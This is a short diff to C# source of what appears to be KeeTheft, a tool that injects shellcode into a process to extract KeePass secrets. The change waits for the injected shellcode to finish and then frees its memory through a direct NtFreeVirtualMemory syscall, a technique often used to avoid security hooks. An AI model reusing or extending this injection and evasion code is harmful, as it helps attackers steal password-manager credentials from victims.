@@ -174,8 +174,9 @@ namespace KeeTheft
                 Marshal.FreeHGlobal(pPlaintextBytes);
 
                 // Dunno why, but VirtualFree was causing crashes...
-                // Thread.Sleep(4000);  // Wait for the shellcode to finish executing
-                // Win32.VirtualFreeEx(ProcessHandle, ShellcodeAddr, 0, Win32.FreeType.Release);
+                Thread.Sleep(4000);  // Wait for the shellcode to finish executing
+                IntPtr RegionSize = IntPtr.Zero;
+                Syscalls.NtFreeVirtualMemory(ProcessHandle, ref ShellcodeAddr, ref RegionSize, DI.Data.Win32.Kernel32.MEM_RELEASE);
             }
         }
 
